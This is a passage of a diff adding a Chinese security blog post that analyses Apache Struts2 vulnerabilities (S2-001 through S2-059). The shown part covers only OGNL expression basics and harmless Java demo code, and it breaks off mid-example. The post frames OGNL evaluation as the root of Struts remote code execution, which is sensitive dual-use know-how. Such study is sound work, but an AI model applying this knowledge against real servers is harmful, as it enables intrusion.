@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic%7CRoboto+Slab:300,300italic,400,400italic,700,700italic%7CPT+Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"f4nx1ng.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInDown"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="整个struts2的漏洞基本上全是ongl表达式的漏洞，都是由于对某些字段非正常的处理导致的意料之外的表达式执行。OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Struts漏洞分析合集">
+<meta property="og:url" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/index.html">
+<meta property="og:site_name" content="f4nx1ng&#39;s blog">
+<meta property="og:description" content="整个struts2的漏洞基本上全是ongl表达式的漏洞，都是由于对某些字段非正常的处理导致的意料之外的表达式执行。OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/ognl.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/testcase.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/poc.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/%E4%BD%8D%E7%BD%AE.jpg">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/001%E5%A4%8D%E7%8E%B0.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/007%E5%A4%8D%E7%8E%B0.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/007%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/013%E5%A4%8D%E7%8E%B0.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/013%E5%88%86%E6%9E%90.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/045%E5%A4%8D%E7%8E%B0.png">
+<meta property="og:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/059%E5%A4%8D%E7%8E%B0.png">
+<meta property="article:published_time" content="2024-08-19T04:25:12.000Z">
+<meta property="article:modified_time" content="2024-08-19T04:31:11.648Z">
+<meta property="article:author" content="f4nx1ng">
+<meta property="article:tag" content="表达式执行">
+<meta property="article:tag" content="Struts">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/ognl.png">
+
+
+<link rel="canonical" href="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/","path":"2024/08/19/Struts漏洞分析合集/","title":"Struts漏洞分析合集"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Struts漏洞分析合集 | f4nx1ng's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">f4nx1ng's blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">16</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">6</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#struts%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">Struts漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ongl%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="nav-number">1.2.</span> <span class="nav-text">ongl表达式</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s2-001"><span class="nav-number">1.3.</span> <span class="nav-text">S2-001</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="nav-number">1.3.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload%E6%9E%84%E9%80%A0"><span class="nav-number">1.3.2.</span> <span class="nav-text">payload构造</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">1.3.3.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s2-007"><span class="nav-number">1.4.</span> <span class="nav-text">S2-007</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="nav-number">1.4.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="nav-number">1.4.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">1.4.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">1.4.4.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s2-013"><span class="nav-number">1.5.</span> <span class="nav-text">S2-013</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="nav-number">1.5.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="nav-number">1.5.2.</span> <span class="nav-text">漏洞复现</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="nav-number">1.5.3.</span> <span class="nav-text">漏洞分析</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s2-045"><span class="nav-number">1.6.</span> <span class="nav-text">S2-045</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="nav-number">1.6.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-number">1.6.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#s2-059"><span class="nav-number">1.7.</span> <span class="nav-text">s2-059</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="nav-number">1.7.1.</span> <span class="nav-text">漏洞描述</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="nav-number">1.7.2.</span> <span class="nav-text">漏洞复现</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="f4nx1ng"
+      src="/images/touxiang.jpg">
+  <p class="site-author-name" itemprop="name">f4nx1ng</p>
+  <div class="site-description" itemprop="description">A big noob</div>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/f4nx1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;f4nx1ng" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://f4nx1ng.github.io/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpg">
+      <meta itemprop="name" content="f4nx1ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="f4nx1ng's blog">
+      <meta itemprop="description" content="A big noob">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Struts漏洞分析合集 | f4nx1ng's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Struts漏洞分析合集
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-08-19 12:25:12 / 修改时间：12:31:11" itemprop="dateCreated datePublished" datetime="2024-08-19T12:25:12+08:00">2024-08-19</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">JAVA安全</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/JAVA%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>整个struts2的漏洞基本上全是ongl表达式的漏洞，都是由于对某些字段非正常的处理导致的意料之外的表达式执行。OGNL
+是 Object-Graph Navigation Language
+的缩写，它是一种功能强大的表达式语言（Expression Language，简称为
+EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p>
+<span id="more"></span>
+<h4 id="struts漏洞">Struts漏洞</h4>
+<h5 id="前言">前言</h5>
+<p>在制定这一次的学习计划之前，了解到整个struts2的漏洞基本上全是ongl表达式的漏洞，所以在正式去分析每一个漏洞之前，还是要先学习一下ongl表达式。</p>
+<h5 id="ongl表达式">ongl表达式</h5>
+<p>由于不想浪费时间在搭建环境上面，所以直接找了一个现有的集成的环境来自</p>
+<p>Al1ex师傅的githubhttps://github.com/Al1ex/CVE-2019-0230</p>
+<p>OGNL 是 Object-Graph Navigation Language
+的缩写，它是一种功能强大的表达式语言（Expression Language，简称为
+EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。</p>
+<p>以下的介绍来自https://xz.aliyun.com/t/2672#toc-3</p>
+<p>1、表达式（Expression）</p>
+<p>表达式是整个 OGNL 的核心，所有的 OGNL
+操作都是针对表达式的解析后进行的。表达式会规定此次 OGNL
+操作到底要干什么。</p>
+<p>2、根对象（Root Object）</p>
+<p>根对象可以理解为 OGNL 的操作对象。在表达式规定了 “干什么”
+以后，你还需要指定到底“对谁干”。</p>
+<p>3、上下文环境（Context）</p>
+<p>有了表达式和根对象，我们实际上已经可以使用OGNL的基本功能。例如，根据表达式对根对象进行取值或者设值工作。不过实际上，在OGNL的内部，所有的操作都会在一个特定的环境中运行，这个环境就是OGNL的上下文环境（Context）。说得再明白一些，就是这个上下文环境（Context），将规定
+OGNL 的操作 “在哪里干”。 OGNL 的上下文环境是一个 Map 结构，称之为
+OgnlContext。上面我们提到的根对象（RootObject），事实上也会被加入到上下文环境中去，并且这将作为一个特殊的变量进行处理，具体就表现为针对根对象（RootObject）的存取操作的表达式是不需要增加
+#符号进行区分的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">表达式的功能清单</span><br><span class="line">1. 基本对象树的访问</span><br><span class="line">对象树的访问就是通过使用点号将对象的引用串联起来进行。</span><br><span class="line">例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">2. 对容器变量的访问</span><br><span class="line">对容器变量的访问，通过#符号加上表达式进行。</span><br><span class="line">例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx</span><br><span class="line"></span><br><span class="line">3. 使用操作符号</span><br><span class="line">OGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, /, ++, --, ==, !=, = 等操作符之外，还能使用 mod, in, not in等。</span><br><span class="line"></span><br><span class="line">4. 容器、数组、对象</span><br><span class="line">OGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]</span><br><span class="line">同时，OGNL支持对Map的按键值查找：</span><br><span class="line">例如：#session[&#x27;mySessionPropKey&#x27;]</span><br><span class="line">不仅如此，OGNL还支持容器的构造的表达式：</span><br><span class="line">例如：&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;构造一个List，#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;构造一个Map</span><br><span class="line">你也可以通过任意类对象的构造函数进行对象新建</span><br><span class="line">例如：new Java.net.URL(&quot;xxxxxx/&quot;)</span><br><span class="line"></span><br><span class="line">5. 对静态方法或变量的访问</span><br><span class="line">要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：</span><br><span class="line"></span><br><span class="line">6. 方法调用</span><br><span class="line">直接通过类似Java的方法调用方式进行，你甚至可以传递参数：</span><br><span class="line">例如：user.getName()，group.users.size()，group.containsUser(#requestUser)</span><br><span class="line"></span><br><span class="line">7. 投影和选择</span><br><span class="line">OGNL支持类似数据库中的投影（projection） 和选择（selection）。</span><br><span class="line">投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个集合中每个元素的公共属性。</span><br><span class="line">例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。</span><br><span class="line">选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：</span><br><span class="line">? 选择满足条件的所有元素</span><br><span class="line">^ 选择满足条件的第一个元素</span><br><span class="line">$ 选择满足条件的最后一个元素</span><br><span class="line">例如：group.userList.&#123;? #txxx.xxx != null&#125;将获得某个group中user的name不为空的user的列表</span><br><span class="line"></span><br><span class="line">8.支持类静态的方法调用和值访问，表达式的格式为@[类全名（包括包路）]@[方法名 |  值名]，例如：</span><br><span class="line">@java.lang.String@add（ &#x27;11&#x27; , &#x27;hahhaha&#x27; ）</span><br><span class="line"></span><br><span class="line">9.支持赋值操作和表达式串联，例如：</span><br><span class="line">number=18, price=100,Total()；那么返回1800；</span><br></pre></td></tr></table></figure>
+<p>对于ognl对象的描述通过文字是很难去理解的，这里放上一个图来简化对ognl对象的理解。图片来源https://www.cnblogs.com/Myarticles/articles/9313947.html</p>
+<img data-src="/2024/08/19/Struts%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/ognl.png" class>
+<p>我们简单的写几个例子来看一下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//User.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>用于测试的类</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> OgnlException &#123;</span><br><span class="line">        <span class="comment">//准备ognl对象</span></span><br><span class="line">        <span class="type">User</span> <span class="variable">rootUser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;Fanxing&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">        Map&lt;String, User&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;user1&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;mike&quot;</span>, <span class="number">17</span>));</span><br><span class="line">        map.put(<span class="string">&quot;user2&quot;</span>,<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;tom&quot;</span>, <span class="number">19</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">OgnlContext</span> <span class="variable">ognlContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">OgnlContext</span>();</span><br><span class="line">        ognlContext.setRoot(rootUser);</span><br><span class="line">        ognlContext.setValues(map);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//取值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) Ognl.getValue(<span class="string">&quot;name&quot;</span>, ognlContext, ognlContext.getRoot());</span><br><span class="line">        System.out.println(name);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> (<span class="type">int</span>) Ognl.getValue(<span class="string">&quot;#user1.age&quot;</span>, ognlContext, ognlContext.getRoot());</span><br><span class="line">        System.out.println(age);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//赋值</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">newName</span> <span class="operator">=</span> (String) Ognl.getValue(<span class="string">&quot;name=&#x27;HH&#x27;, name&quot;</span>, ognlContext, ognlContext.getRoot());</span><br><span class="line">        System.out.println(newName);</span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">newAge</span> <span class="operator">=</span> (Integer) Ognl.getValue(<span class="string">&quot;#user2.age = 100, 